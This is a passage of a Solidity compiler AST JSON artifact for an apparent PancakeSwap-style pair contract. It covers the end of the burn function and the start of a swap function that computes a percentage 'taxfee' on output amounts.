																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1825,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1286,
														"src": "9248:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1830,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9248:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1831,
												"nodeType": "ExpressionStatement",
												"src": "9248:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1832,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1745,
													"src": "9311:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1842,
												"nodeType": "IfStatement",
												"src": "9307:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1840,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1833,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "9318:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1838,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "9345:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1835,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "9331:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1834,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "9326:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1836,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "9326:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1837,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2298,
																"src": "9326:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1839,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9326:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "9318:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1841,
													"nodeType": "ExpressionStatement",
													"src": "9318:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1844,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "9414:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1845,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "9414:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1846,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1695,
															"src": "9426:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1847,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1697,
															"src": "9435:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1848,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1690,
															"src": "9444:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 1843,
														"name": "Burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1114
														],
														"referencedDeclaration": 1114,
														"src": "9409:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,address)"
														}
													},
													"id": 1849,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9409:38:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1850,
												"nodeType": "EmitStatement",
												"src": "9404:43:6"
											}
										]
									},
									"documentation": null,
									"id": 1852,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1693,
											"modifierName": {
												"argumentTypes": null,
												"id": 1692,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "8074:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "8074:4:6"
										}
									],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1691,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1690,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "8048:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1689,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8048:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8038:26:6"
									},
									"returnParameters": {
										"id": 1698,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1695,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "8088:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1694,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8088:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1697,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1852,
												"src": "8102:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1696,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8102:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8087:28:6"
									},
									"scope": 2224,
									"src": "8025:1429:6",
									"stateMutability": "nonpayable",
									"superFunction": 823,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2147,
										"nodeType": "Block",
										"src": "12089:2733:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1872,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1868,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1866,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1854,
																	"src": "12120:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1867,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12133:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "12120:14:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1871,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1869,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1856,
																	"src": "12138:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1870,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12151:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "12138:14:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "12120:32:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
															"id": 1873,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12166:37:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\""
															}
														],
														"id": 1865,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "12099:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1874,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12099:114:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1875,
												"nodeType": "ExpressionStatement",
												"src": "12099:114:6"
											},
											{
												"assignments": [
													1877,
													1879,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1877,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "12224:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1876,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "12224:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1879,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "12243:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1878,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "12243:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1882,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1880,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1054,
														"src": "12266:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1881,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12266:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12223:56:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1890,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1886,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1884,
																	"name": "amount0Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1854,
																	"src": "12325:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1885,
																	"name": "_reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1877,
																	"src": "12338:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "12325:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1889,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1887,
																	"name": "amount1Out",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1856,
																	"src": "12351:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1888,
																	"name": "_reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1879,
																	"src": "12364:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "12351:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "12325:48:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c4951554944495459",
															"id": 1891,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12387:33:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_410624995b1b083dcf6f8603df497c85feb7b93fc33473e1167ca929c6d9b9e6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY\""
															}
														],
														"id": 1883,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "12304:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1892,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12304:126:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1893,
												"nodeType": "ExpressionStatement",
												"src": "12304:126:6"
											},
											{
												"assignments": [
													1895
												],
												"declarations": [
													{
														"constant": false,
														"id": 1895,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "12441:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1894,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12441:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1896,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12441:13:6"
											},
											{
												"assignments": [
													1898
												],
												"declarations": [
													{
														"constant": false,
														"id": 1898,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "12464:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1897,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12464:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1899,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12464:13:6"
											},
											{
												"id": 2037,
												"nodeType": "Block",
												"src": "12487:1304:6",
												"statements": [
													{
														"assignments": [
															1901
														],
														"declarations": [
															{
																"constant": false,
																"id": 1901,
																"name": "taxamount0Out",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "12501:18:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1900,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12501:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1910,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1909,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1902,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1854,
																"src": "12522:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1908,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1905,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1903,
																				"name": "amount0Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1854,
																				"src": "12536:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1904,
																				"name": "taxfee",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 972,
																				"src": "12549:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12536:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1906,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12535:21:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1907,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12559:3:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12535:27:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12522:40:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12501:61:6"
													},
													{
														"assignments": [
															1912
														],
														"declarations": [
															{
																"constant": false,
																"id": 1912,
																"name": "taxamount1Out",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "12576:18:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1911,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12576:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1921,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1920,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1913,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1856,
																"src": "12597:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1919,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1916,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1914,
																				"name": "amount1Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1856,
																				"src": "12611:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1915,
																				"name": "taxfee",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 972,
																				"src": "12624:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12611:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1917,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12610:21:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1918,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12634:3:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12610:27:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12597:40:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12576:61:6"
													},
													{
														"assignments": [
															1923
														],
														"declarations": [
															{
																"constant": false,
																"id": 1923,
																"name": "_token0",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "12719:15:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1922,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12719:7:6",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1925,
														"initialValue": {
															"argumentTypes": null,
															"id": 1924,
															"name": "token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 968,
															"src": "12737:6:6",
															"typeDescriptions": {
